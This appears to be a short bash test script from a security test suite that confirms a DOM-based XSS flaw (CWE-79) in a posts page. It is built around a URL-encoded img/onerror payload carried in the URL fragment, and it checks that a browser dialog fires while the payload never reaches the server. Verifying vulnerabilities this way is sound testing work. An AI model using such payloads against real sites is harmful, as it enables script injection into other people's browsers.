#!/usr/bin/env bash
# DOMXSS-001 (CWE-79): the posts list reads location.hash and writes it into the
# document with innerHTML. The payload lives in the fragment, so it is never sent
# to the server — no response body ever contains it, and only a real browser can
# observe the sink firing.
set -e; . "$(dirname "$0")/_lib.sh"
M="DOMXSS-PROVEN-7f3a"
PAYLOAD="%3Cimg%20src%3Dx%20onerror%3Dalert('$M')%3E"
# the fragment never reaches the server: it is absent from the response body
curl -s "$TARGET/posts" | grep -q "$M" && exit 1
browser_dialog "$TARGET/posts#$PAYLOAD" "$M"
